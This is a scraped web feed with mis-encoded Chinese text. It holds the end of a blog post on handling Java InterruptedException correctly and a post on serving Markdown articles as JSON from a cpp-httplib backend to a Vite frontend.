<p>å¦‚æœä½ åœ¨ <code>catch</code> å—ä¸­ä»€ä¹ˆéƒ½ä¸åšï¼ˆSwallow the exceptionï¼‰ï¼Œæˆ–è€…åªæ˜¯ç®€å•æ‰“å°æ—¥å¿—ï¼Œé‚£ä¹ˆçº¿ç¨‹çœ‹èµ·æ¥å°±åƒä»æœªè¢«ä¸­æ–­è¿‡ä¸€æ ·ã€‚</p>
<h2 data-id="heading-2">ç»“æœ -- â€åƒµå°¸çº¿ç¨‹â€œ</h2>
<p>è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªå…¸å‹çš„ç”Ÿäº§ç¯å¢ƒ Bugã€‚å‡è®¾ä½ éœ€è¦åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­ä¸æ–­å¤„ç†ä»»åŠ¡ï¼Œç›´åˆ°çº¿ç¨‹æ± å…³é—­ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ä¾é ä¸­æ–­çŠ¶æ€æ¥åˆ¤æ–­æ˜¯å¦ç»“æŸ</span>
    <span class="hljs-keyword">while</span> (!Thread.currentThread().isInterrupted()) { 
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ¨¡æ‹Ÿæ‰§è¡Œä»»åŠ¡</span>
            doWork();
            <span class="hljs-comment">// æ¨¡æ‹Ÿé˜»å¡</span>
            Thread.sleep(<span class="hljs-number">1000</span>); 
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            <span class="hljs-comment">//  é”™è¯¯åšæ³•ï¼šåªæ˜¯æ‰“å°æ—¥å¿—ï¼Œæ²¡æœ‰æ¢å¤çŠ¶æ€</span>
            System.out.println(<span class="hljs-string">"æ”¶åˆ°åœæ­¢ä¿¡å·ï¼Œä½†æˆ‘æŠŠä¿¡å·æä¸¢äº†..."</span>);
        }
    }
    System.out.println(<span class="hljs-string">"çº¿ç¨‹é€€å‡º"</span>);
}
</code></pre>
<p><strong>å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</strong></p>
<ol>
<li>å¤–éƒ¨è°ƒç”¨ <code>future.cancel(true)</code> æˆ– <code>executor.shutdownNow()</code>ï¼Œå‘é€ä¸­æ–­ä¿¡å·ã€‚</li>
<li><code>sleep()</code> æ­¤æ—¶è¢«å”¤é†’ï¼Œå®ƒ<strong>æ¸…é™¤æ ‡å¿—ä½</strong>ï¼ˆå˜å› <code>false</code>ï¼‰ï¼ŒæŠ›å‡ºå¼‚å¸¸ã€‚</li>
<li>è¿›å…¥ <code>catch</code> å—ï¼Œæ‰“å°æ—¥å¿—ã€‚</li>
<li>ä»£ç ç»§ç»­è¿è¡Œï¼Œå›åˆ° <code>while</code> å¾ªç¯å¤´éƒ¨ã€‚</li>
<li>æ£€æŸ¥ <code>!isInterrupted()</code>ï¼Œç”±äºåˆšæ‰æ ‡å¿—ä½è¢«æ¸…é™¤äº†ï¼Œè¿™é‡Œè¿”å› <code>true</code>ï¼ˆå³è®¤ä¸ºæ²¡æœ‰è¢«ä¸­æ–­ï¼‰ã€‚</li>
<li><strong>çº¿ç¨‹ç»§ç»­æ­»å¾ªç¯æ‰§è¡Œ</strong>ï¼Œæ— æ³•åœæ­¢ã€‚</li>
</ol>
<p>è¿™å°±æ˜¯æ‰€è°“çš„<strong>åƒµå°¸çº¿ç¨‹</strong>â€”â€”ä½ ä»¥ä¸ºä½ æŠŠå®ƒæ€æ­»äº†ï¼Œä½†å®ƒåªæ˜¯â€œéœ‡åŠ¨â€äº†ä¸€ä¸‹ï¼ˆæŠ›äº†ä¸ªå¼‚å¸¸ï¼‰ï¼Œç„¶ååƒæ²¡äº‹äººä¸€æ ·ç»§ç»­è·‘ã€‚</p>
<h2 data-id="heading-3">æ­£ç¡®çš„å§¿åŠ¿ -- æ¢å¤ç°åœº</h2>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ•è·å¼‚å¸¸åï¼Œ<strong>æ‰‹åŠ¨æ¢å¤</strong>åˆšæ‰ä¸¢å¤±çš„ä¸­æ–­çŠ¶æ€ã€‚</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">while</span> (!Thread.currentThread().isInterrupted()) {
        <span class="hljs-keyword">try</span> {
            doWork();
            Thread.sleep(<span class="hljs-number">1000</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            System.out.println(<span class="hljs-string">"è¢«ä¸­æ–­ï¼Œå‡†å¤‡é€€å‡º..."</span>);
            
            <span class="hljs-comment">// æ­£ç¡®åšæ³•ï¼šé‡æ–°è®¾ç½®ä¸­æ–­çŠ¶æ€</span>
            Thread.currentThread().interrupt(); 
            
            <span class="hljs-comment">// é€šå¸¸é…åˆ break è·³å‡ºå¾ªç¯</span>
            <span class="hljs-keyword">break</span>; 
        }
    }
}
</code></pre>
<p>è¿™è¡Œä»£ç çš„ä½œç”¨å°±æ˜¯å‘Šè¯‰åç»­çš„ä»£ç ï¼ˆåŒ…æ‹¬ <code>while</code> åˆ¤æ–­ï¼Œæˆ–è€…è°ƒç”¨æ ˆä¸Šå±‚çš„ä»£ç ï¼‰ï¼šâ€œ<strong>åˆšæ‰å‘ç”Ÿè¿‡ä¸­æ–­ï¼Œè™½ç„¶å¼‚å¸¸æŠŠæ ‡å¿—ä½æ¸…é™¤äº†ï¼Œä½†æˆ‘ç°åœ¨æŠŠå®ƒè¡¥å›æ¥ã€‚</strong> â€</p>
<p>é‚£ä½ å¯èƒ½æœ‰ç–‘é—®ï¼Ÿä¸ºå•¥æˆ‘ä¸ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Ÿä½ å¯ä»¥æŠ›å‡ºå¼‚å¸¸ï¼Œä½†æ˜¯åˆ†åœºæ™¯æ¥ã€‚</p>
<ul>
<li>
<p><strong>å¯ä»¥æŠ›å‡ºæ—¶ï¼š</strong> å¦‚æœä½ çš„æ–¹æ³•ç­¾åå…è®¸æŠ›å‡ºï¼ˆä¾‹å¦‚ä½ å†™çš„æ˜¯æ™®é€šä¸šåŠ¡æ–¹æ³•ï¼‰ï¼Œé‚£<strong>ä¼˜å…ˆé€‰æ‹©æŠ›å‡ºå¼‚å¸¸</strong>ï¼Œè¿™æ˜¯æœ€æ­£ç¡®çš„åšæ³•ï¼Œè®©ä¸Šå±‚å†³å®šå¦‚ä½•å¤„ç†ã€‚</p>
</li>
<li>
<p><strong>ä¸èƒ½æŠ›å‡ºæ—¶ï¼š</strong> åœ¨å®ç° <code>Runnable.run()</code> æ¥å£æ—¶ï¼Œ<code>run</code> æ–¹æ³•çš„ç­¾åæ˜¯å›ºå®šçš„ï¼Œ<strong>ä¸å…è®¸æŠ›å‡ºå—æ£€å¼‚å¸¸</strong>ã€‚ä½ å¿…é¡»åœ¨å†…éƒ¨ <code>try-catch</code>ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ æ•è·äº†å¼‚å¸¸ï¼Œå°±å¿…é¡»è´Ÿè´£<strong>æ¢å¤çŠ¶æ€</strong>ï¼Œä»¥ä¾¿è°ƒç”¨æ ˆä¸Šå±‚çš„ä»£ç èƒ½æ„ŸçŸ¥åˆ°â€œå“¦ï¼ŒåŸæ¥æœ‰äººæƒ³è®©æˆ‘åœæ­¢â€</p>
</li>
</ul>
<h3 data-id="heading-4">æ—¶åºé—®é¢˜</h3>
<p>æˆ‘ä»¬é€šè¿‡ä¸€æ®µä»£ç æ¥éªŒè¯æˆ‘ä»¬æ‰€è¯´çš„é—®é¢˜ï¼Œä½“éªŒç¬é—´çš„å˜åŒ–ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">try</span> {
        System.out.println(<span class="hljs-string">"1. å‡†å¤‡ç¡è§‰"</span>);
        Thread.sleep(<span class="hljs-number">5000</span>);
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        <span class="hljs-comment">// å½“æˆ‘ä»¬è¿›å…¥è¿™é‡Œæ—¶ï¼ŒJVM å·²ç»æŠŠæ ‡å¿—ä½æ¸…é™¤äº†</span>
        System.out.println(<span class="hljs-string">"3. æ•è·å¼‚å¸¸ï¼Œæ­¤æ—¶æ ‡å¿—ä½æ˜¯: "</span> + Thread.currentThread().isInterrupted()); <span class="hljs-comment">// è¾“å‡º false</span>
        
        <span class="hljs-comment">// æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨â€œæ¢å¤â€</span>
        Thread.currentThread().interrupt();
        System.out.println(<span class="hljs-string">"4. æ‰‹åŠ¨æ¢å¤åï¼Œæ ‡å¿—ä½æ˜¯: "</span> + Thread.currentThread().isInterrupted()); <span class="hljs-comment">// è¾“å‡º true</span>
    }
});

t.start();
Thread.sleep(<span class="hljs-number">100</span>); <span class="hljs-comment">// ç¡®ä¿å­çº¿ç¨‹å·²ç»ç¡ç€äº†</span>

System.out.println(<span class="hljs-string">"2. ä¸»çº¿ç¨‹è°ƒç”¨ interrupt"</span>);
t.interrupt(); <span class="hljs-comment">// è¿™ä¸€ç¬é—´ï¼Œt çš„æ ‡å¿—ä½å…¶å®æ˜¯ trueï¼Œä½†å¾ˆå¿«å°±è¢« sleep å†…éƒ¨é€»è¾‘æ¸…é™¤äº†</span>
</code></pre>
<p>å‡è®¾çº¿ç¨‹ A æ­£åœ¨ <code>Thread.sleep(10000)</code>ï¼š</p>
<ol>
<li>
<p><strong>Step 1: å…¶ä»–çº¿ç¨‹åŠ¨ä½œ</strong> å…¶ä»–çº¿ç¨‹è°ƒç”¨ <code>threadA.interrupt()</code>ã€‚</p>
<ul>
<li><strong>ç»“æœï¼š</strong> æ­¤æ—¶ï¼Œçº¿ç¨‹ A çš„ä¸­æ–­æ ‡å¿—ä½ç¬é—´å˜ä¸º <strong><code>true</code></strong>ã€‚</li>
</ul>
</li>
<li>
<p><strong>Step 2: çº¿ç¨‹ A (JVM å†…éƒ¨æœºåˆ¶) å“åº”</strong> çº¿ç¨‹ A å¤„äº <code>sleep</code> çŠ¶æ€ï¼ŒJVM å†…éƒ¨æœºåˆ¶æ£€æµ‹åˆ°äº†æ ‡å¿—ä½å˜æˆäº† <code>true</code>ã€‚</p>
</li>
<li>
<p><strong>Step 3: æ¸…é™¤çŠ¶æ€ (å…³é”®æ­¥éª¤)</strong> JVM å†³å®šå”¤é†’çº¿ç¨‹ Aã€‚<strong>ä½†åœ¨å”¤é†’å¹¶æŠ›å‡ºå¼‚å¸¸ä¹‹å‰</strong>ï¼ŒJVM ä¼šåšä¸€ä¸ªåŠ¨ä½œï¼š<strong>å°†ä¸­æ–­æ ‡å¿—ä½é‡ç½®ï¼ˆæ¸…é™¤ï¼‰ä¸º <code>false</code></strong>ã€‚</p>
<ul>
<li><em>ä¸ºä»€ä¹ˆè¦æ¸…é™¤ï¼Ÿ</em> å°±åƒä½ è®¾å®šäº†ä¸€ä¸ªé—¹é’Ÿï¼Œé—¹é’Ÿå“äº†ï¼ˆæŠ›å‡ºå¼‚å¸¸ï¼‰ï¼Œä½ é†’æ¥åç¬¬ä¸€ä»¶äº‹æ˜¯æŒ‰ä¸‹é—¹é’Ÿçš„åœæ­¢é”®ï¼ˆæ¸…é™¤æ ‡å¿—ï¼‰ï¼Œå¦åˆ™å®ƒä¼šä¸€ç›´å“ã€‚</li>
</ul>
</li>
<li>
<p><strong>Step 4: æŠ›å‡ºå¼‚å¸¸</strong> JVM æŠ›å‡º <code>InterruptedException</code>ï¼Œæ§åˆ¶æƒè¿›å…¥ä½ çš„ <code>catch</code> å—ã€‚</p>
<ul>
<li><strong>ç»“æœï¼š</strong> å½“ä»£ç è¿è¡Œåˆ° <code>catch</code> å—é‡Œé¢æ—¶ï¼Œä½ å¦‚æœå»æŸ¥ <code>isInterrupted()</code>ï¼Œçœ‹åˆ°çš„å°±æ˜¯ <strong><code>false</code></strong>ã€‚</li>
</ul>
</li>
</ol>
<h2 data-id="heading-5">æ€»ç»“</h2>
<p><strong>æ°¸è¿œä¸è¦ç”Ÿåï¼ˆSwallowï¼‰ä¸­æ–­å¼‚å¸¸</strong>ï¼Œé™¤éä½ æ˜ç¡®çŸ¥é“ä½ çš„çº¿ç¨‹è®¾è®¡å°±æ˜¯ä¸ºäº†å¿½ç•¥åœæ­¢ä¿¡å·</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»åç«¯è·å–æ•°æ®ä¼ è¾“åˆ°å‰ç«¯è¿›è¡Œæ˜¾ç¤º(cpp-httplib+Vditor+Handlebars)]]></title>    <link>https://juejin.cn/post/7589958976226541578</link>    <guid>https://juejin.cn/post/7589958976226541578</guid>    <pubDate>2026-01-02T05:56:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589958976226541578" data-draft-id="7589962224795680806" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»åç«¯è·å–æ•°æ®ä¼ è¾“åˆ°å‰ç«¯è¿›è¡Œæ˜¾ç¤º(cpp-httplib+Vditor+Handlebars)"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-02T05:56:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="charlee44"/> <meta itemprop="url" content="https://juejin.cn/user/1117549770846872"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»åç«¯è·å–æ•°æ®ä¼ è¾“åˆ°å‰ç«¯è¿›è¡Œæ˜¾ç¤º(cpp-httplib+Vditor+Handlebars)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1117549770846872/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    charlee44
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T05:56:21.000Z" title="Fri Jan 02 2026 05:56:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. å¼•è¨€</h2>
<p>åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ï¼Œç¬”è€…å®ç°äº†ä¸€ä¸ªæ¸²æŸ“ Markdown æ ¼å¼æ–‡ç« çš„ç½‘é¡µå‰ç«¯ Vite é¡¹ç›®ï¼ˆå‚çœ‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fcharlee44.com%2Fpost.html%3Fid%3D1f8bf6fca114499fb1db7e15e9777ac7" target="_blank" title="https://charlee44.com/post.html?id=1f8bf6fca114499fb1db7e15e9777ac7" ref="nofollow noopener noreferrer">ã€Šç»™ Markdown æ¸²æŸ“ç½‘é¡µå¢åŠ ä¸€ä¸ªç›®å½•ç»„ä»¶(Vite+Vditor+Handlebars)ã€‹</a>ï¼‰,ä»¥åŠä¸€ä¸ªæ”¯æŒ Markdownæ ¼å¼æ•°æ®çš„é™æ€æ–‡ä»¶æœåŠ¡çš„åç«¯é¡¹ç›®ï¼ˆå‚çœ‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fcharlee44.com%2Fpost.html%3Fid%3Dae7a9a676916493f8f73c6217273b7eb" target="_blank" title="https://charlee44.com/post.html?id=ae7a9a676916493f8f73c6217273b7eb" ref="nofollow noopener noreferrer">ã€Šä½¿ç”¨cpp-httplibå‘å¸ƒé™æ€æ–‡ä»¶æœåŠ¡ã€‹</a>ï¼‰ã€‚åœ¨è¿™é‡Œï¼Œå°±å°†å‰ç«¯ä¸åç«¯æ‰“é€šï¼Œé€šè¿‡ cpp-httplib æä¾›çš„ API æ¥å£åŠ¨æ€è¿”å› Markdown æ–‡ç« æ•°æ®ï¼Œç”±å‰ç«¯ Vite é¡¹ç›®åˆ©ç”¨ Handlebars æ¨¡æ¿ä¸ Vditor æ¸²æŸ“å¼•æ“å®Œæˆå±•ç¤ºä¸äº¤äº’ã€‚</p>
<h2 data-id="heading-1">2. å®ç°</h2>
<h3 data-id="heading-2">2.1 åç«¯</h3>
<p>JSON æ˜¯ HTTP ä¼ è¾“ä¸­äº‹å®ä¸Šçš„æ ‡å‡†æ•°æ®æ ¼å¼ï¼Œå°¤å…¶æ˜¯åœ¨ç°ä»£ Web APIï¼ˆç‰¹åˆ«æ˜¯ RESTful APIï¼‰ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å°†åç«¯çš„æ¥å£æ”¹æˆè¿”å› JSON æ ¼å¼æ•°æ®çš„æ¥å£ã€‚æŒ‰ç…§ RESTful API é£æ ¼ï¼Œå‘½åä¸º <code>/api/v1/post</code>ï¼Œä½¿ç”¨ HTTP çš„ Get æ–¹æ³•ã€‚å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;httplib.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;filesystem&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;nlohmann/json.hpp&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"BlogData.h"</span></span>

<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> nlohmann;
<span class="hljs-keyword">namespace</span> fs = std::filesystem;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
  httplib::Server svr;

  std::u8string docRoot =
      <span class="hljs-string">u8"D:/Work/HttpServer/public/æœ€å°äºŒä¹˜é—®é¢˜è¯¦è§£1ï¼šçº¿æ€§æœ€å°äºŒä¹˜"</span>;

  svr.<span class="hljs-built_in">Get</span>(<span class="hljs-string">"/api/v1/post"</span>,
          [&amp;](<span class="hljs-type">const</span> httplib::Request&amp; req, httplib::Response&amp; res) {
            DataTransfer::BlogData blogData;

            {
              fs::path blogMetaJsonPath = fs::<span class="hljs-built_in">path</span>(docRoot) / <span class="hljs-string">"meta.json"</span>;
              nlohmann::json blogMetaJson;
              ifstream <span class="hljs-built_in">infile</span>(blogMetaJsonPath);
              infile &gt;&gt; blogMetaJson;
              blogData.blogMeta = blogMetaJson;
            }

            {
              fs::path blogContentPath =
                  fs::<span class="hljs-built_in">path</span>(docRoot) / <span class="hljs-string">u8"æœ€å°äºŒä¹˜é—®é¢˜è¯¦è§£1ï¼šçº¿æ€§æœ€å°äºŒä¹˜.md"</span>;
              std::ifstream <span class="hljs-built_in">file</span>(blogContentPath, std::ios::binary);

              std::string <span class="hljs-built_in">content</span>((std::<span class="hljs-built_in">istreambuf_iterator</span>&lt;<span class="hljs-type">char</span>&gt;(file)),
                                  std::<span class="hljs-built_in">istreambuf_iterator</span>&lt;<span class="hljs-type">char</span>&gt;());
              blogData.content = std::<span class="hljs-built_in">move</span>(content);
            }

            <span class="hljs-comment">// æ„é€ å“åº” JSON</span>
            json response_data = blogData;

            <span class="hljs-comment">// è®¾ç½®å“åº”</span>
            res.<span class="hljs-built_in">set_header</span>(<span class="hljs-string">"Access-Control-Allow-Origin"</span>,
                           <span class="hljs-string">"http://127.0.0.1:8000"</span>);  <span class="hljs-comment">// å…è®¸è·¨åŸŸ</span>
            res.<span class="hljs-built_in">set_content</span>(response_data.<span class="hljs-built_in">dump</span>(), <span class="hljs-string">"application/json"</span>);
          });

  std::cout &lt;&lt; <span class="hljs-string">"Server listening on http://127.0.0.1:8080\n"</span>;
  svr.<span class="hljs-built_in">listen</span>(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">8080</span>);

  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>è¿™æ®µä»£ç çš„å®ç°éå¸¸ç®€å•ï¼Œåˆ†åˆ«è¯»å–å…ƒæ•°æ® <code>meta.json</code> å’Œ æ–‡ç« å†…å®¹ <code>æœ€å°äºŒä¹˜é—®é¢˜è¯¦è§£1ï¼šçº¿æ€§æœ€å°äºŒä¹˜.md</code> æ–‡ä»¶ï¼Œç»„ç»‡æˆ JSON æ ¼å¼ï¼Œè®¾ç½®åˆ° HTTP å“åº”çš„å†…å®¹ä¸­å¹¶ä¸”è¿”å›ã€‚å…¶ä¸­ï¼Œç”¨åˆ° nlohmann/json å¯¹ ç»“æ„ä½“å¯¹è±¡åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼ˆå‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fcharlee44.com%2Fpost.html%3Fid%3Dd5736f77509345b2a66a2de4a70beb31" target="_blank" title="https://charlee44.com/post.html?id=d5736f77509345b2a66a2de4a70beb31" ref="nofollow noopener noreferrer">ã€ŠC++ä¸­JSONåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å®ç°ã€‹</a>ï¼‰ã€‚</p>
<p>å¦å¤–éœ€è¦æ³¨æ„çš„å°±æ˜¯è·¨åŸŸé—®é¢˜ã€‚ç”±äºå‰ç«¯é¡¹ç›®ä¸åç«¯é¡¹ç›®æ˜¯åˆ†ç¦»çš„ï¼Œå› æ­¤å®ƒä»¬å¤„åœ¨ä¸åŒçš„åŸŸä¸­ï¼Œå‰ç«¯è¦è¯·æ±‚åç«¯çš„èµ„æºï¼Œå°±ä¼šå‘ç”Ÿè·¨åŸŸé—®é¢˜ã€‚è§£å†³åŠæ³•å°±æ˜¯åœ¨ HTTP çš„å“åº”å¤´ä¸­è®¾ç½®å…è®¸è·¨åŸŸçš„é”®å’Œå€¼ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp">res.<span class="hljs-built_in">set_header</span>(<span class="hljs-string">"Access-Control-Allow-Origin"</span>, <span class="hljs-string">"http://127.0.0.1:8000"</span>);  <span class="hljs-comment">// å…è®¸è·¨åŸŸ</span>
</code></pre>
<h3 data-id="heading-3">2.2 å‰ç«¯</h3>
<p>å‰ç«¯çš„ä¿®æ”¹å°±ç®€å•å¤šäº†ï¼Œåªéœ€è¦ä¿®æ”¹è·å–è¿œç«¯æ•°æ®çš„æ¥å£å°±å¯ä»¥äº†ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">const</span> response = await <span class="hljs-built_in">fetch</span>(<span class="hljs-string">"http://127.0.0.1:8080/api/v1/post"</span>);
<span class="hljs-keyword">if</span> (!response.ok) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"ç½‘ç»œæ— å“åº”"</span>);
}
<span class="hljs-type">const</span> blogData = await response.<span class="hljs-built_in">json</span>();
<span class="hljs-comment">//...</span>
</code></pre>
